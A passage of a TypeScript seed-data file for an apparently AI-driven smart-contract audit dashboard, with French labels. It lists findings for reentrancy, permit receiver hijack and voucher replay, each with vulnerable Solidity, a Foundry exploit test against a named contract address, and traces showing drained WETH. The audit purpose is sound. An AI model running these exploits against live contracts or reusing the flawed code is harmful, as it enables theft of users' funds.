        // VULNERABLE: external call before state update (missing CEI & nonReentrant)
        IERC20(asset).safeTransfer(receiver, t.assets);
        IHookReceiver(receiver).onWithdrawClaimed(ticketIds[i], t.assets);
        t.claimed = true;
    }
}`,
      pocFile: 'test/poc/AegisDoubleClaimPoC.t.sol',
      pocSource: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {AegisWithdrawalQueue} from "../../src/queue/AegisWithdrawalQueue.sol";

contract AegisDoubleClaimPoC is Test {
    AegisWithdrawalQueue queue = AegisWithdrawalQueue(0x71cE5f02A9aC31fA402aE2aA0f114bB19283C911);
    uint256 reenterCount;
    uint256[] ids;

    function test_DoubleClaimDrainsQueue() public {
        vm.createSelectFork(vm.envString("FORK_RPC_URL"), 21240811);
        uint256 beforeBal = queue.asset().balanceOf(address(this));
        ids.push(4091);
        queue.claimBatchWithPermit(ids, address(this), block.timestamp + 60, _sign(ids));
        uint256 stolen = queue.asset().balanceOf(address(this)) - beforeBal;
        assertGt(stolen, 180 ether, "Expected multi-claim drain");
    }

    function onWithdrawClaimed(uint256, uint256) external {
        if (reenterCount < 2) {
            reenterCount++;
            queue.claimBatchWithPermit(ids, address(this), block.timestamp + 60, _sign(ids));
        }
    }
}`,
      pocReplayCommand:
        'FOUNDRY_FFI=false FORK_RPC_URL=$ETH_RPC forge test --match-path test/poc/AegisDoubleClaimPoC.t.sol -vvvv',
      pocReplayTrace: `[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.8.26
Running 1 test for test/poc/AegisDoubleClaimPoC.t.sol:AegisDoubleClaimPoC
[PASS] test_DoubleClaimDrainsQueue() (gas: 318492)
Traces:
  [318492] AegisDoubleClaimPoC::test_DoubleClaimDrainsQueue()
    ├─ [210440] AegisWithdrawalQueue::claimBatchWithPermit([4091], AegisDoubleClaimPoC, ...)
    │   ├─ [34210] WETH::transfer(AegisDoubleClaimPoC, 65000000000000000000 [6.5e19])
    │   ├─ [154020] AegisDoubleClaimPoC::onWithdrawClaimed(4091, 65e18)
    │   │   └─ [148910] AegisWithdrawalQueue::claimBatchWithPermit([4091], ...) [REENTRANT CALL #1]
    │   │       ├─ [29100] WETH::transfer(AegisDoubleClaimPoC, 65e18)
    │   │       └─ [94200] AegisWithdrawalQueue::claimBatchWithPermit([4091], ...) [REENTRANT CALL #2]
    │   │           └─ [29100] WETH::transfer(AegisDoubleClaimPoC, 65e18)
    └─ ← [Return] stolen = 195.000000000000000000 WETH (expected 65 WETH)

Clean-room re-execution: PASS (2/2 runs deterministic, block 21240811)`,
      cleanRoomVerified: true,
      disconfirmer: {
        status: 'clear',
        ranAt: '2026-11-26T08:54:02.000Z',
        legitimateAlternativeTest:
          'Aucune combinaison de fonctions légitimes (requestWithdraw, claim, redeem) ne permet d’extraire 195 WETH à partir d’un dépôt initial de 65 WETH.',
        notes:
          'Le callback onWithdrawClaimed est appelé sur tout contrat receiver implémentant ERC165/hook sans liste blanche. Aucune restriction d’accès ni verrou nonReentrant sur claimBatchWithPermit.',
        canKillFinding: false,
      },
      recommendation:
        'Appliquer le pattern Checks-Effects-Interactions en écrivant t.claimed = true avant tout transfert externe, et ajouter le modificateur nonReentrant sur claimBatchWithPermit ainsi que sur la fonction sœur claimSingleWithCallback.',
      fixReviews: [],
    },
    {
      id: 'FND-AEGIS-02',
      scanId: 'scan-aegis-v2',
      title: 'Redirection des fonds par omission de receiver dans le digest EIP-712',
      severity: 'high',
      status: 'operator_confirmed',
      source: 'autonomous_hunter',
      createdAt: '2026-11-26T09:38:04.000Z',
      summary:
        'Le struct EIP-712 signé par le déposant (ClaimPermit) ne hache que ticketIds, deadline et nonce. Le paramètre receiver passé à claimBatchWithPermit n’est pas couvert par la signature : le relayer ou tout attaquant observant la mempool peut remplacer receiver par sa propre adresse et voler l’intégralité du retrait.',
      verbatimImpactLine:
        'Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield',
      affectedFileLine: 'src/queue/AegisWithdrawalQueue.sol:228-246',
      affectedCode: `bytes32 constant CLAIM_PERMIT_TYPEHASH =
    keccak256("ClaimPermit(uint256[] ticketIds,uint256 deadline,uint256 nonce)");

function _verifyPermit(
    uint256[] calldata ticketIds,
    uint256 deadline,
    bytes calldata signature
) internal {
    require(block.timestamp <= deadline, "EXPIRED");
    bytes32 structHash = keccak256(abi.encode(
        CLAIM_PERMIT_TYPEHASH,
        keccak256(abi.encodePacked(ticketIds)),
        deadline,
        nonces[msg.sender]++
    ));
    address signer = ECDSA.recover(_hashTypedDataV4(structHash), signature);
    require(signer == tickets[ticketIds[0]].owner, "INVALID_SIG");
}`,
      pocFile: 'test/poc/AegisPermitHijackPoC.t.sol',
      pocSource: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {AegisWithdrawalQueue} from "../../src/queue/AegisWithdrawalQueue.sol";

contract AegisPermitHijackPoC is Test {
    AegisWithdrawalQueue queue = AegisWithdrawalQueue(0x71cE5f02A9aC31fA402aE2aA0f114bB19283C911);

    function test_MempoolAttackerRedirectsPermitClaim() public {
        vm.createSelectFork(vm.envString("FORK_RPC_URL"), 21240811);
        address attacker = makeAddr("attacker");
        (uint256[] memory ids, uint256 deadline, bytes memory victimSig) = _capturedVictimPermit();

        vm.prank(attacker);
        queue.claimBatchWithPermit(ids, attacker, deadline, victimSig);
        assertEq(queue.asset().balanceOf(attacker), 42 ether);
    }
}`,
      pocReplayCommand:
        'FOUNDRY_FFI=false FORK_RPC_URL=$ETH_RPC forge test --match-path test/poc/AegisPermitHijackPoC.t.sol -vvvv',
      pocReplayTrace: `[PASS] test_MempoolAttackerRedirectsPermitClaim() (gas: 162108)
  └─ Attacker received 42.000000000000000000 WETH from victim ticket #4112
Clean-room re-execution: PASS (2/2 runs deterministic, block 21240811)`,
      cleanRoomVerified: true,
      disconfirmer: {
        status: 'clear',
        ranAt: '2026-11-26T09:39:15.000Z',
        legitimateAlternativeTest:
          'Le propriétaire du ticket n’a jamais autorisé l’adresse attacker ; aucun appel légitime ne permet à un tiers de détourner un retrait signé.',
        notes: 'Confirmé également par la capture dApp (seam-1 / seam-2) sur app.aegisvault.fi.',
        canKillFinding: false,
      },
      recommendation:
        'Inclure address receiver dans CLAIM_PERMIT_TYPEHASH et dans le calcul de structHash, et indexer nonces[signer] au lieu de nonces[msg.sender].',
      signoff: {
        confirmedAt: '2026-11-26T09:41:00.000Z',
        confirmedBy: 'admin',
        impactJustification:
          'Vol direct des fonds en transit lors de toute soumission de retrait gasless via le relayer.',
        preconditionJustification:
          'L’interface officielle demande la signature EIP-712 sans receiver et la transmet au relayer ; exploitable sans privilège.',
        deploymentCheck: 'verified_at_block',
        deploymentJustification:
          'Bytecode vérifié aligné sur le commit 9f84c21 au bloc Ethereum 21240811.',
        blockNumber: 21_240_811,
      },
      fixReviews: [],
    },
    {
      id: 'FND-LAB-01',
      scanId: 'scan-vuln-vault-seam',
      title: 'Rejeu illimité de voucher dans SeamVault.withdrawWithVoucher',
      severity: 'critical',
      status: 'candidate',
      source: 'autonomous_hunter',
      createdAt: '2026-11-26T07:30:10.000Z',
      summary:
        'withdrawWithVoucher vérifie la signature backend sur (msg.sender, amount, nonce) mais n’enregistre jamais usedNonces[nonce] = true. Un utilisateur peut rejouer le même voucher jusqu’à vider le contrat.',
      verbatimImpactLine: null,
      affectedFileLine: 'src/SeamVault.sol:74-93',
      affectedCode: `function withdrawWithVoucher(uint256 amount, uint256 nonce, bytes calldata sig) external {
    bytes32 digest = keccak256(abi.encodePacked(msg.sender, amount, nonce)).toEthSignedMessageHash();
    require(ECDSA.recover(digest, sig) == voucherSigner, "BAD_SIG");
    // Missing: require(!usedNonces[nonce]); usedNonces[nonce] = true;
    token.transfer(msg.sender, amount);
}`,
      pocFile: 'test/poc/SeamVoucherReplay.t.sol',
      pocSource: `contract SeamVoucherReplay is Test {
    function test_ReplayVoucherDrainsVault() public {
        for (uint i = 0; i < 3; i++) {
            vault.withdrawWithVoucher(10 ether, 7, validSig);
        }
        assertEq(token.balanceOf(address(vault)), 0);
    }
}`,
      pocReplayCommand: 'FOUNDRY_FFI=false forge test --match-path test/poc/SeamVoucherReplay.t.sol -vvv',
      pocReplayTrace: `[PASS] test_ReplayVoucherDrainsVault() (gas: 94210)
  └─ Vault balance: 30.00 ETH -> 0.00 ETH after 3 identical voucher replays
Clean-room re-execution: PASS (2/2 runs deterministic)`,
      cleanRoomVerified: true,
      disconfirmer: {
        status: 'clear',
        ranAt: '2026-11-26T07:34:00.000Z',
        legitimateAlternativeTest:
          'Un voucher émis pour 10 ETH ne devrait jamais permettre un retrait cumulé de 30 ETH.',
        notes: 'Fixture locale confirmée. Export bounty bloqué automatiquement par L9.',
        canKillFinding: false,
      },
      recommendation:
        'Ajouter un mapping mapping(bytes32 => bool) usedVouchers indexé par le digest complet et marquer le digest consommé avant token.transfer.',
      fixReviews: [],
    },
  ];

  return {
    scans: [scanAegis, scanHelios, scanLab, scanStrata],
    findings,
  };
}

export function createInitialAdvancedSnapshot(scans: ScanRun[]): AdvancedSnapshot {
  return {
    llmPool: [
      { id: 'slot-1', provider: 'Google Gemini', model: 'gemini-4-neon', role: 'planner + worker (SC)', active: true },
      { id: 'slot-2', provider: 'Google Gemini', model: 'gemini-4-neon', role: 'disconfirmer (R13)', active: true },
      { id: 'slot-3', provider: 'Google Gemini', model: 'gemini-4-neon', role: 'threat_modeler draft', active: true },
    ],
    agents: [
      {
        name: 'threat_modeler',
        role: 'Brouillon structuré post-ingest (statut pipeline_auto)',
        lock: 'R12, R16, G10 (merge)',
        guidanceExcerpt:
          'Ne jamais inventer d’impacts en mode labo. Injecter verbatimImpacts, exclusions et tombstones historiques avant la génération d’hypothèses.',
      },
      {
        name: 'sc_worker',
        role: 'Chasseur autonome guidé (1 worker unique)',
        lock: 'LOCK #2 (1 worker), LOCK #5 (PoC clean-room), R9',
        guidanceExcerpt:
          'SCWorkerGuidance branché : prioriser les fonctions monétaires non testées (Door A) et coutures web2↔web3. Appeler close_hypothesis avec artifact_id obligatoire pour tout kill.',
      },
      {
        name: 'disconfirmer',
        role: 'Contre-vérification automatique après PostRecordSCFinding',
        lock: 'LOCK #4, R10, R13',
        guidanceExcerpt:
          'Tenter de reconstruire l’état final avec les seules fonctions légitimes (R13). Signale uniquement, ne peut jamais tuer un candidat.',
      },
    ],
    skills: [
      {
        name: 'sc-web2-web3-seam',
        scope: 'Web2 ↔ Web3',
        enabled: true,
        description: 'Capture les signatures EIP-712 et transactions relayer puis rejoue dans un Anvil tempdir isolé (G12).',
      },
      {
        name: 'sc-foundry-cleanroom',
        scope: 'PoC Verification',
        enabled: true,
        description: 'Exécute forge test avec FOUNDRY_FFI=false et FORK_RPC_URL injecté (G11) sur deux runs déterministes.',
      },
      {
        name: 'sc-patchlag-siblings',
        scope: 'Fix Review',
        enabled: true,
        description: 'Rejoue les PoC sur la branche PR/commit et recherche les sinks frères non corrigés.',
      },
    ],
    mcpTools: [
      { name: 'scan_target', gate: 'G0 déterministe', description: 'Lance un scan complet sur une URL programme, repo ou chemin local.' },
      { name: 'get_scan', gate: 'Lecture', description: 'Retourne l’état persistant du scan, les étapes et les lignes G0.' },
      { name: 'list_scan_findings', gate: 'Lecture', description: 'Liste les candidats et statuts de contre-vérification.' },
      { name: 'sc_run_ingest', gate: 'FOUNDRY_FFI=false', description: 'Exécute build + ingest persisté et refuse de tourner sans forge.' },
      { name: 'sc_report_finding', gate: 'LOCK #5', description: 'Soumet un candidat uniquement si le PoC clean-room passe.' },
      { name: 'sc_fix_review_pr', gate: 'No auto-PR post', description: 'Rejoue les PoC sur un commit/PR et renvoie le résumé copiable.' },
      { name: 'sc_export_finding', gate: 'U-1 + L9', description: 'Exporte en anglais (Immunefi/Cantina/Sherlock) uniquement après validation humaine.' },
    ],
    serverLogs: [
      { ts: '09:51:45', level: 'warn', component: 'g0.verdict', msg: 'scan-helios-arb -> NEEDS_INPUT (rpc arbitrum manquant)' },
      { ts: '09:44:00', level: 'info', component: 'scan.orchestrator', msg: 'scan-aegis-v2 -> stopped (budget 150k/150k atteint)' },
      { ts: '09:41:00', level: 'info', component: 'sc.signoff', msg: 'FND-AEGIS-02 -> operator_confirmed (verified_at_block 21240811)' },
      { ts: '08:54:02', level: 'info', component: 'sc.disconfirmer', msg: 'FND-AEGIS-01 -> clear (R13 legitimate alternative checked)' },
      { ts: '07:34:00', level: 'info', component: 'scan.orchestrator', msg: 'scan-vuln-vault-seam -> done (mode labo, L9 active)' },
    ],
    capturedTraffic: scans.flatMap((s) => s.seamEvents),
  };
}
